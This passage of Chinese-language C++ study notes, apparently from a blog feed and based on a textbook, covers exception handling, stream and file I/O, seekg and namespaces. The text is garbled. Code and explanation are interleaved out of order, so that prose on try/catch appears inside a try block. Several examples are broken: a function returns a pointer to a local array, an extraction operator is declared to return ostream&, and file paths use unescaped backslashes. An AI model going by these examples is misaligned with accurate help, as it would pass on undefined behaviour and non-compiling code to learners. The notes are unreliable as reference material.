<p>a = a1;</p>
<p>b = b1;</p>
<p>}</p>
<p>AT max();</p>
<p>};</p>
<p>template <typename AT></p>
<p>AT compare<AT>::max() {</p>
<p>return a &gt; b ? a : b;</p>
<p>}</p>
<p>int main() {</p>
<p>compare<int>op1(4, 5);</p>
<p>cout &lt;&lt; op1.max() &lt;&lt; endl;</p>
<p>return 0;</p>
<p>}</p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>//生成一个有10个相同成员的数组，成员的值位于0到10之间</p>
<p>int* arr(int a) {</p>
<p>if (a &gt; 10 || a &lt; 0)throw a;</p>
<p>int arr1[10] = { a };</p>
<p>return arr1;</p>
<p>}</p>
<p>int main() {</p>
<p>int* a;</p>
<p>int* b;</p>
<p>try {在函数中可能出错的地方用throw抛出异常，抛出异常后立即结束函数调用跳出</p>
<p>将可能出错的函数放在try语句中运行</p>
<p>抛出异常后，由catch语句捕捉处理</p>
<p>说明：</p>
<p>try和catch后面的语句必须带有花括号</p>
<p>catch后面的括号中，一般只写异常信息的类型即可</p>
<p>catch后面的括号中，用 ··· 可以捕获所有异常</p>
<p>在某种情况下，throw可以不包括表达式</p>
<p>C++一旦抛出异常，但程序不捕获的话，系统会中断程序</p>
<p>**第七章：****C++**<strong>的流类库与输入输出</strong></p>
<p>C++的输入输出系统比C语言更加安全可靠，可以解决C语言中scanf和printf函数参数没写对而导致错误</p>
<p>输出的问题</p>
<p>a = arr(5);</p>
<p>b = arr(55);</p>
<p>}</p>
<p>catch(int){</p>
<p>cout &lt;&lt; &quot;超出数组边界&quot; &lt;&lt; endl;</p>
<p>}</p>
<p>return 0;</p>
<p>}printf和scanf只能输入输出预定义的数据类型，C++中可以重载&gt;&gt; ,&lt;&lt;来输入输出自定义类型的数据</p>
<p>**C++**<strong>流的概述</strong></p>
<p><strong>输入输出流</strong></p>
<p>C++输入输出以字节流的形式实现，字节流从输入设备流向内存，从内存流向输出设备。</p>
<p>用于输入输出的头文件：</p>
<p>iostream：标准I/O</p>
<p>fstream：文件I/O</p>
<p>strstream：字符串I/O</p>
<p>iomanip：用于格式控制</p>
<p><strong>预定义的流对象</strong></p>
<p>与输入设备相联系的流对象称为输入流对象</p>
<p>与输出设备相联系的流对象称为输出流对象</p>
<p>预定义的流对象：</p>
<p>cin：与标准输入设备相联系（键盘）</p>
<p>cout：与标准输出设备相联系（显示器）</p>
<p>cerr：与标准错误输出设备相联系（显示器）</p>
<p>clog：与标准错误输出设备相联系（显示器）</p>
<p>cerr和clog都是用来输出错误信息，区别在于cerr不经过缓冲区直接显示在显示器上</p>
<p><strong>输入输出的成员函数</strong></p>
<p>put 函数：用于输出一个字符，参数可以是ASCII码或者字符</p>
<p>get 函数：读取一个字符（包括空白符），赋给字符变量ch，读取失败返回0</p>
<p>getline 函数：从输入流读取n-1个字符，赋值给特定字符数组，然后插入一个字符串结束标识\n</p>
<p>getline 和 cin&lt;&lt; 的区别：</p>
<p>getline只能读取字符类型数据，cin&lt;&lt;可以读取各种类型</p>
<p>getline可以读取空白符，cin&lt;&lt;以空白符作为终止状态</p>
<p>ignore 函数：跳过输入流中的n个字符，或者遇到指定终止字符时提前结束</p>
<p><strong>输入输出的格式控制</strong></p>
<p>用到的时候去查就行</p>
<p>cout.put(char c);</p>
<p>cin.get(ch);</p>
<p>cin.getline(字符数组/字符指针,字符个数n,终止标识字符)</p>
<p>cin.ignore(n,终止字符);<strong>类名</strong></p>
<p><strong>说明</strong></p>
<p>ifstream</p>
<p>输入文件流类</p>
<p>ofstream</p>
<p>输出文件流类</p>
<p>fstream</p>
<p>输入输出文件流类</p>
<p><strong>用户定义类型的输入输出</strong></p>
<p>可以通过重载运算符&lt;&lt;和&gt;&gt;来实现</p>
<p><strong>重载插入运算符</strong>**&lt;&lt;**</p>
<p>其中第一个参数：ostream类对象out的引用，第二个参数是用户自定义的对象</p>
<p>重载插入运算符可以是友元函数或者普通函数，不能是成员函数</p>
<p><strong>重载提取运算符</strong>**&gt;&gt;**</p>
<p>与插入运算符类似</p>
<p><strong>文件的输入输出</strong></p>
<p>C++把文件看成字符序列，一个文件是由一个个字符顺序组成的。可以分为文本文件和二进制文件</p>
<p>文本文件每个字节存放一个ASCII码，代表一个字符</p>
<p>二进制文件按内存存储形式原样存放</p>
<p>文件输入输出的基本过程如下：</p>
<p>\1. 打开文件：创建流对象，与文件向关联</p>
<p>\2. 读写操作</p>
<p>\3. 关闭文件</p>
<p><strong>文件的打开与关闭</strong></p>
<p>进行文件的输入输出，其实是建立一个流对象，将这个流对象与文件相关联，流对象的使用类似于标准</p>
<p>流对象cin和cout</p>
<p>用于输入输出的类：</p>
<p>建立流对象，其实就是建立输入输出流类的对象，例如：</p>
<p>ostream &amp;operator&lt;&lt;(ostream &amp;out,user_name&amp; obj){</p>
<p>out&lt;&lt;obj.item1;</p>
<p>out&lt;&lt;obj.item2;</p>
<p>return out;</p>
<p>}</p>
<p>ostream &amp;operator&gt;&gt;(istream &amp;in,user_name&amp; obj){</p>
<p>in&gt;&gt;obj.item1;</p>
<p>in&gt;&gt;obj.item2;</p>
<p>return in;</p>
<p>}<strong>打开方式</strong></p>
<p><strong>描述</strong></p>
<p>ios::app</p>
<p>追加模式。所有写入都追加到文件末尾。</p>
<p>ios::ate</p>
<p>文件打开后定位到文件末尾。</p>
<p>ios::in</p>
<p>打开文件用于读取。</p>
<p>ios::out</p>
<p>打开文件用于写入。</p>
<p>ios::trunc</p>
<p>如果该文件已经存在，其内容将在打开文件之前被截断，即把文件长度设为 0。</p>
<p>使用成员函数open打开文件：</p>
<p>打开方式：</p>
<p>关闭文件则是通过调用成员函数close()来进行关闭，不需要参数</p>
<p>整个打开关闭文件流程如下：</p>
<p><strong>文本文件的读写</strong></p>
<p>打开文件建立流对象之后，就可以进行读写操作了</p>
<p>文本文件的读写示例：</p>
<p>ifstream in;</p>
<p>ofstream out;</p>
<p>fstream both;</p>
<p>in.open(文件名，打开方式)</p>
<p>#include<fstream></p>
<p>#include<iostream></p>
<p>int main(){</p>
<p>fstream out;</p>
<p>out.open(&quot;C:\test.txt&quot;,ios::out|ios::in);</p>
<p>out.close();</p>
<p>return 0;</p>
<p>}</p>
<p>#include<iostream></p>
<p>#include<fstream></p>
<p>using namespace std;</p>
<p>int main() {</p>
<p>ofstream out;</p>
<p>out.open(&quot;C:\Users\halo\Desktop\tmp\cpp.txt&quot;);//打开文件</p>
<p>out &lt;&lt; &quot;hello world&quot; &lt;&lt; endl;//写入数据</p>
<p>out.close();//关闭文件</p>
<p>ifstream in;</p>
<p>char str[80];</p>
<p>in.open(&quot;C:\Users\halo\Desktop\tmp\cpp.txt&quot;);</p>
<p>in.getline(str, 80, '\n');</p>
<p>cout &lt;&lt; str &lt;&lt; endl;//输出读取的内容<strong>二进制文件的读写</strong></p>
<p>打开方式要使用 ios::binary</p>
<p>有两种方式进行读写：</p>
<p>\1. put和get</p>
<p>\2. read和write</p>
<p>put和get读写示例：</p>
<p>write和read用法</p>
<p>in.close();</p>
<p>return 0;</p>
<p>}</p>
<p>#include<iostream></p>
<p>#include<fstream></p>
<p>#include<string></p>
<p>using namespace std;</p>
<p>int test_write(string fpath) {</p>
<p>ofstream outf(fpath, ios::binary);//构造函数与open成员函数功能相同</p>
<p>if (!outf) {</p>
<p>cout &lt;&lt; &quot;open fail!&quot; &lt;&lt; endl;</p>
<p>exit(1);</p>
<p>}</p>
<p>char ch = 'a';</p>
<p>for (int i = 0; i &lt; 26; i++) {</p>
<p>outf.put(ch);</p>
<p>ch++;</p>
<p>}</p>
<p>outf.close();</p>
<p>return 0;</p>
<p>}</p>
<p>int test_read(string fpath) {</p>
<p>ifstream inf(fpath, ios::binary);</p>
<p>if (!inf) {</p>
<p>cout &lt;&lt; &quot;read fail!&quot; &lt;&lt; endl;</p>
<p>exit(1);</p>
<p>}</p>
<p>char ch;</p>
<p>while (inf.get(ch))cout &lt;&lt; ch;</p>
<p>inf.close();</p>
<p>return 0;</p>
<p>}</p>
<p>int main() {</p>
<p>string fpath = &quot;C:\Users\halo\Desktop\tmp\cpp.txt&quot;;</p>
<p>test_write(fpath);</p>
<p>test_read(fpath);</p>
<p>return 0;</p>
<p>}第一个参数是数据起始地址，第二个参数是数据长度</p>
<p><strong>二进制文件的随机读写</strong></p>
<p>本段内容来自菜鸟教程：https://www.runoob.com/cplusplus/cpp-files-streams.html</p>
<p>istream 和 ostream 都提供了用于重新定位文件位置指针的成员函数。这些成员函数包括关于 istream</p>
<p>的 seekg（&quot;seek get&quot;）和关于 ostream 的 seekp（&quot;seek put&quot;）。</p>
<p>seekg 和 seekp 的参数通常是一个长整型。第二个参数可以用于指定查找方向。查找方向可以是</p>
<p>ios::beg（默认的，从流的开头开始定位），也可以是 ios::cur（从流的当前位置开始定位），也可以是</p>
<p>ios::end（从流的末尾开始定位）。</p>
<p>文件位置指针是一个整数值，指定了从文件的起始位置到指针所在位置的字节数。下面是关于定位</p>
<p>&quot;get&quot; 文件位置指针的实例：</p>
<p><strong>命名空间</strong></p>
<p>用来解决名字冲突问题</p>
<p>定义命名空间：</p>
<p>使用命名空间：</p>
<p><strong>头文件命名规则</strong></p>
<p>使用带后缀.h 的头文件，则不必使用命名空间</p>
<p>使用不带后缀的头文件，需要声明命名空间std;</p>
<p>inf.read(char* buf,int len)</p>
<p>outf.write(const char* buf,int len)</p>
<p>// 定位到 fileObject 的第 n 个字节（假设是 ios::beg）</p>
<p>fileObject.seekg( n );</p>
<p>// 把文件的读指针从 fileObject 当前位置向后移 n 个字节</p>
<p>fileObject.seekg( n, ios::cur );</p>
<p>// 把文件的读指针从 fileObject 末尾往回移 n 个字节</p>
<p>fileObject.seekg( n, ios::end );</p>
<p>// 定位到 fileObject 的末尾</p>
<p>fileObject.seekg( 0, ios::end );</p>
<p>namespace NS{</p>
<p>int i=5;</p>
<p>int j=10;</p>
<p>}</p>
<p>using namespace NS;</p>
<p>cout &lt;&lt; i&lt;&lt; endl;</p>
<p>cout &lt;&lt; NS::i &lt;&lt;endl;<strong>参考资料</strong>**😗*</p>
<p>《C++面向对象程序设计教程(第四版)》</p>
<p>《C++面向对象程序设计教程(第四版)习题解答与上机指导》</p>
]]></content>
    </entry>
</feed>